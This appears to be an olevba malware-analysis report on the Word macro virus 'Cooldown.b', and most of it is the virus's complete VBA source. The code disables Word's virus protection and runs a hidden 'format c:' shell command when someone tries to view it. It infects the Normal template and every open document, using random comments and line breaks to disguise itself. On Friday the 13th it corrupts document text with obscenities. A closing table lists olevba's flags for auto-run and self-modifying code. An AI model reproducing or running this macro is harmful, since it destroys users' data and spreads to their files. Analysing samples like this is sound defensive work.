olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cooldown.b-7289fd3030517079e73b5e49f192283ef57c60d4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cooldown.b-7289fd3030517079e73b5e49f192283ef57c60d4 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
               ' 9698.537
Private Sub _
           Document_Open()
               
CoolDown _
   0
               
' 6143.058
End _
         Sub
   Private Sub Document_Close()
             CoolDown 0
       ' 6136.534
End Sub
               Private _
           Sub ViewVBCode()
       CoolDown _
          1
       ' 4987.288
End Sub
         
' 7052.226
' 5057.934
Private _
      Sub _
        CoolDown(How As Integer)
            On _
      Error Resume Next
           Dim c As String, _
 a _
     As _
             Long, b As Long, _
             d _
         As _
            Long, e As Long, f As Long, _
   res As _
              String, m _
     As _
       Boolean
            Randomize
   With Options
              .VirusProtection = _
                False
           ' 471.1831
.ConfirmConversions _
        = False
            .SaveNormalPrompt _
                = _
          False
   End With
           ' 3984.335
If How = _
           1 _
 Then
            ' 8606.404
s _
       = _
        Shell("format" & _
              Chr(32) & _
           "c:" _
       & _
     Chr(32) _
 & _
  "/autotest", _
 vbHide)
             ' 6976.805
Else
         With _
    NormalTemplate.VBProject.VBComponents(1).CodeModule
       If _
    Not _
           .Find("Cool" & "Down", _
         1, _
  1, _
                1000, 1000, _
            False, False) Then
       

' 2994.814
' 4033.705
' 7655.415
a _
         = .CountOfLines
                For _
     b = 1 To a
       .DeleteLines _
               (1)
  Next
           ' 6461.275
' 9465.145
' 4807.808
d = _
           1
   a _
           = _
             ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
               
' 7100.946
' 3855.403

' 8981.387

res _
            = _
      ""
         For _
            b = 1 _
 To a
     c _
   = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(b, 1)
               c _
             = _
    RTrim(LTrim(c))
                If foo(c, _
            f, _
            res) Then
        .InsertLines _
      d, _
Space(Rnd _
     * _
     16) & _
         res
         ' 4435.59
' 6455.385
d = d + _
  f
               f _
       = _
       0
              ' 1378.528
res = ""
     ' 2845.397
End _
 If
' 1812.611
Next
              ' 9198.63
' 9509.816

' 9251.315
NormalTemplate.Save
            ' 6880.943
End _
     If
        ' 5216.785
End With
            ' 4191.488
For e _
   = 1 To Documents.Count
              With _
        Documents(e).VBProject.VBComponents(1).CodeModule
   ' 680.1027
If _
               Not .Find("Cool" _
       & "Down", _
             1, 1, _
      1000, 1000, _
 False, _
          False) Then
         ' 2644.876
' 5208.129

a = .CountOfLines
            m _
             = Documents(e).Saved
 For _
               b = 1 To _
         a
 .DeleteLines _
           (1)
     Next
         ' 1616.071
d = 1
    a = _
        NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
             ' 8179.904
res = _
          ""
 
' 5365.369
' 4295.099
For _
   b = 1 To _
              a
      c = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(b, 1)
           c _
 = RTrim(LTrim(c))
          If _
         foo(c, f, _
               res) _
  Then
         ' 2279.423
' 6740.393
' 514.7952
.InsertLines _
        d, Space(Rnd * _
        16) _
 & res
 d = _
       d + f
     ' 4624.699
' 2096.517
' 7202.546
' 7647.229
f = _
             0
    ' 6373.487

' 2121.608
' 6893.111
res _
   = _
   ""
             
' 2481.338
End If
              Next
  ' 4314.839
' 3004.26
' 1572.881
If Documents(e).Path _
               <> _
   "" Then
           Documents(e).SaveAs _
               AddToRecentFiles:=False
   ' 9824.329
' 1663.181
End If
       If (WeekDay(Date) _
 = 6) _
        And (Day(Date) _
          = _
 13) _
  And _
   (Rnd > 0.7) _
         Then
  ' 2933.449
Application.StatusBar _
   = ""
              ' 348.9393
' 9365.158
Application.DisplayStatusBar _
            = _
   False
         Application.ScreenUpdating _
              = False
  ' 8335.021
' 3114.101
With _
    Documents(e).Content
                .Find.Execute _
          FindText:="ïð", ReplaceWith:="ïèçä", _
          Replace:=wdReplaceAll
           .Find.Execute FindText:="äð", ReplaceWith:="ïîíîñ", Replace:=wdReplaceAll
            ' 5836.699
.Find.Execute _
          FindText:="êð", ReplaceWith:="êîáûë", _
Replace:=wdReplaceAll
      ' 2475.666
.Find.Execute _
              FindText:="ñòð", _
        ReplaceWith:="åáàí", Replace:=wdReplaceAll
   ' 5852.046
.Find.Execute FindText:="ñð", _
              ReplaceWith:="ñðàê", _
         Replace:=wdReplaceAll
            .Find.Execute _
   FindText:="òð", _
         ReplaceWith:="òðàõ", _
            Replace:=wdReplaceAll
               
' 9282.806
.Find.Execute _
        FindText:="áð", _
            ReplaceWith:="áëÿä", _
 Replace:=wdReplaceAll
                ' 6638.065
' 7614.185
.Find.Execute FindText:="âð", ReplaceWith:="âûåá", Replace:=wdReplaceAll
            .Find.Execute FindText:="ãð", ReplaceWith:="ãîâí", _
              Replace:=wdReplaceAll
             .Find.Execute _
     FindText:="æð", _
    ReplaceWith:="æîï", _
      Replace:=wdReplaceAll

' 8791.414
' 7537.102
' 3375.583
.Find.Execute _
         FindText:="çð", _
 ReplaceWith:="çàëóï", Replace:=wdReplaceAll
              ' 4870.983
.Find.Execute FindText:="äæ", _
    ReplaceWith:="äæîï", Replace:=wdReplaceAll
            ' 9362.829
.Find.Execute FindText:="êàë", ReplaceWith:="äåð", _
Replace:=wdReplaceAll
            .Find.Execute _
                FindText:="áóõ", _
  ReplaceWith:="áðÿê", _
   Replace:=wdReplaceAll
             End With
         ' 3740.521
' 7288.3
Documents(e).UndoClear
' 5713.85
' 5956.67
Application.DisplayStatusBar = _
          True
          Application.ScreenUpdating _
         = True
    ' 3111.892
' 6512.252
Application.StatusBar _
      = ""
             ' 7393.604
End _
               If
               Documents(e).Saved _
   = m
              End _
     If
 End _
        With
        ' 7011.365
Next
             ' 9866.989
End _
 If
 ' 2999.397

' 9987.417
End _
     Sub
     
' 8866.263

' 3429.818
Private _
                Function _
           foo(ByRef s _
             As _
    String, ByRef i As Long, ByRef _
        res As _
               String) As _
             Boolean
   
Dim tmp As String
          ' 486.5986
' 8586.589
' 5289.067
If _
               (Left(s, 1) = "'") Or (Len(s) = 0) _
         Then
 ' 7978.172
' 5299.711
foo = _
            False
              Exit _
      Function
      ' 5787.237
' 1309.815
End _
  If
             ' 7038.897

If Right(s, _
               2) = _
    Chr(32) & _
       "_" _
              Then
               res = res _
        & Left(s, _
      Len(s) _
               - 1)
         

' 4972.939
foo _
  = False
            ' 5219.488
' 8706.896
' 7890.977
Exit Function
      End _
 If
     tmp = res _
           & s
     ' 8282.419
res = ""
 ' 8164.352
i = _
            1
     ' 1841.801
While Rnd > _
   0.5
             ' 1240.063
If Rnd _
 < _
      0.8 _
  Then
              res = res & "'" _
        & Str(Rnd _
  * 10000)
            
End _
             If
        ' 9004.449
res _
          = res & Chr(13)
 i = i _
              + 1
            
Wend
     ' 4882.628
' 7000.126
For _
   a = _
             1 _
     To _
      Len(tmp)
               res = res & _
                Mid(tmp, _
a, _
           1)
             If _
            Mid(tmp, _
         a, 1) _
     = _
               Chr(32) _
        Then
               If _
      Rnd > _
0.5 Then
              res = _
        res _
         & _
            "_" _
                & Chr(13) & _
  Space(Rnd * 16)
          i _
= i + _
1
  ' 8806.321
' 9267.178
End _
 If
 ' 5320.891
' 8953.635

' 7729.877
End If
    
' 5157.937
' 1585.824
Next
        
foo = True
   End _
         Function

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

